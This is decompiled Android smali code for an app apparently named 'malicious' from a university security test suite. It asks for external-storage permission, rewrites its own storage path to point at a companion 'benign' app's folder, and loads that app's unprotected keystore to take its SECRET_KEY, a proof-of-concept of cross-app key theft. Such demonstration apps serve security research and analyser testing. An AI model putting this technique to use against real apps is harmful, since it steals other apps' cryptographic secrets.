.class public Ledu/ksu/cs/malicious/MainActivity;
.super Landroid/support/v7/app/AppCompatActivity;
.source "MainActivity.java"


# static fields
.field public static REQ_CODE:I

.field private static TAG:Ljava/lang/String;

.field static secretKey:Ljavax/crypto/SecretKey;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 23
    const-string v0, "Malicious"

    sput-object v0, Ledu/ksu/cs/malicious/MainActivity;->TAG:Ljava/lang/String;

    .line 24
    const/16 v0, 0x65

    sput v0, Ledu/ksu/cs/malicious/MainActivity;->REQ_CODE:I

    .line 26
    const/4 v0, 0x0

    sput-object v0, Ledu/ksu/cs/malicious/MainActivity;->secretKey:Ljavax/crypto/SecretKey;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 21
    invoke-direct {p0}, Landroid/support/v7/app/AppCompatActivity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 30
    invoke-super {p0, p1}, Landroid/support/v7/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 31
    const v0, 0x7f09001b

    invoke-virtual {p0, v0}, Ledu/ksu/cs/malicious/MainActivity;->setContentView(I)V

    .line 33
    const-string v0, "android.permission.READ_EXTERNAL_STORAGE"

    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v1

    invoke-static {}, Landroid/os/Process;->myUid()I

    move-result v2

    invoke-virtual {p0, v0, v1, v2}, Ledu/ksu/cs/malicious/MainActivity;->checkPermission(Ljava/lang/String;II)I

    move-result v0

    if-nez v0, :cond_0

    .line 34
    invoke-virtual {p0}, Ledu/ksu/cs/malicious/MainActivity;->readFromKeyStore()V

    goto :goto_0

    .line 36
    :cond_0
    const-string v0, "android.permission.READ_EXTERNAL_STORAGE"

    filled-new-array {v0}, [Ljava/lang/String;

    move-result-object v0

    sget v1, Ledu/ksu/cs/malicious/MainActivity;->REQ_CODE:I

    invoke-static {p0, v0, v1}, Landroid/support/v4/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    .line 38
    :goto_0
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 2
    .param p1, "requestCode"    # I
    .param p2, "permissions"    # [Ljava/lang/String;
    .param p3, "grantResults"    # [I

    .line 42
    sget v0, Ledu/ksu/cs/malicious/MainActivity;->REQ_CODE:I

    if-ne p1, v0, :cond_1

    .line 43
    array-length v0, p3

    if-lez v0, :cond_0

    const/4 v0, 0x0

    aget v0, p3, v0

    if-nez v0, :cond_0

    .line 44
    sget-object v0, Ledu/ksu/cs/malicious/MainActivity;->TAG:Ljava/lang/String;

    const-string v1, "Permission granted."

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 45
    invoke-virtual {p0}, Ledu/ksu/cs/malicious/MainActivity;->readFromKeyStore()V

    goto :goto_0

    .line 47
    :cond_0
    new-instance v0, Ljava/lang/RuntimeException;

    const-string v1, "Permission denied."

    invoke-direct {v0, v1}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/String;)V

    throw v0

    .line 50
    :cond_1
    sget-object v0, Ledu/ksu/cs/malicious/MainActivity;->TAG:Ljava/lang/String;

    const-string v1, "Not the expected request result."

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 52
    :goto_0
    return-void
.end method

.method readFromKeyStore()V
    .locals 9

    .line 55
    const v0, 0x7f07005b

    invoke-virtual {p0, v0}, Ledu/ksu/cs/malicious/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    .line 56
    .local v0, "result":Landroid/widget/TextView;
    new-instance v1, Ljava/io/File;

    const/4 v2, 0x0

    invoke-virtual {p0, v2}, Ledu/ksu/cs/malicious/MainActivity;->getExternalFilesDir(Ljava/lang/String;)Ljava/io/File;

    move-result-object v3

    const-string v4, "secretKeyStore"

    invoke-direct {v1, v3, v4}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 57
    .local v1, "file":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v3

    .line 58
    .local v3, "absPath":Ljava/lang/String;
    const-string v4, "edu.ksu.cs.malicious"

    const-string v5, "edu.ksu.cs.benign"

    invoke-virtual {v3, v4, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v4

    .line 59
    .local v4, "modifiedPath":Ljava/lang/String;
    sget-object v5, Ledu/ksu/cs/malicious/MainActivity;->TAG:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Absolute Path = "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 60
    sget-object v5, Ledu/ksu/cs/malicious/MainActivity;->TAG:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Modified Path = "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 62
    move-object v5, v2

    .line 64
    .local v5, "keyStore":Ljava/security/KeyStore;
    :try_start_0
    invoke-static {}, Ljava/security/KeyStore;->getDefaultType()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Ljava/security/KeyStore;->getInstance(Ljava/lang/String;)Ljava/security/KeyStore;

    move-result-object v6

    move-object v5, v6

    .line 65
    new-instance v6, Ljava/io/FileInputStream;

    new-instance v7, Ljava/io/File;

    invoke-direct {v7, v4}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-direct {v6, v7}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 66
    .local v6, "fis":Ljava/io/FileInputStream;
    invoke-virtual {v5, v6, v2}, Ljava/security/KeyStore;->load(Ljava/io/InputStream;[C)V

    .line 67
    const-string v7, "SECRET_KEY"

    invoke-virtual {v5, v7, v2}, Ljava/security/KeyStore;->getEntry(Ljava/lang/String;Ljava/security/KeyStore$ProtectionParameter;)Ljava/security/KeyStore$Entry;

    move-result-object v2

    check-cast v2, Ljava/security/KeyStore$SecretKeyEntry;

    .line 68
    .local v2, "secretKeyEntry":Ljava/security/KeyStore$SecretKeyEntry;
    invoke-virtual {v2}, Ljava/security/KeyStore$SecretKeyEntry;->getSecretKey()Ljavax/crypto/SecretKey;

    move-result-object v7

    sput-object v7, Ledu/ksu/cs/malicious/MainActivity;->secretKey:Ljavax/crypto/SecretKey;

    .line 69
    const-string v7, "Successfully retrieved the key."

    invoke-virtual {v0, v7}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 70
    sget-object v7, Ledu/ksu/cs/malicious/MainActivity;->TAG:Ljava/lang/String;

    const-string v8, "Successfully retrieved the key."

    invoke-static {v7, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/security/UnrecoverableEntryException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/security/KeyStoreException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/security/cert/CertificateException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/security/NoSuchAlgorithmException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 70
    .end local v2    # "secretKeyEntry":Ljava/security/KeyStore$SecretKeyEntry;
    .end local v6    # "fis":Ljava/io/FileInputStream;
    goto :goto_0

    .line 75
    :catch_0
    move-exception v2

    .line 76
    .local v2, "e":Ljava/lang/Exception;
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    .line 77
    new-instance v6, Ljava/lang/RuntimeException;

    invoke-direct {v6, v2}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v6

    .line 71
    .end local v2    # "e":Ljava/lang/Exception;
    :catch_1
    move-exception v2

    .line 72
    .local v2, "e":Ljava/security/UnrecoverableEntryException;
    invoke-virtual {v2}, Ljava/security/UnrecoverableEntryException;->printStackTrace()V

    .line 73
    const-string v6, "Failed to retrieve the key."

    invoke-virtual {v0, v6}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 74
    sget-object v6, Ledu/ksu/cs/malicious/MainActivity;->TAG:Ljava/lang/String;

    const-string v7, "Failed to retrieve the key."

    invoke-static {v6, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 78
    .end local v2    # "e":Ljava/security/UnrecoverableEntryException;
    :goto_0
    nop

    .line 79
    return-void
.end method
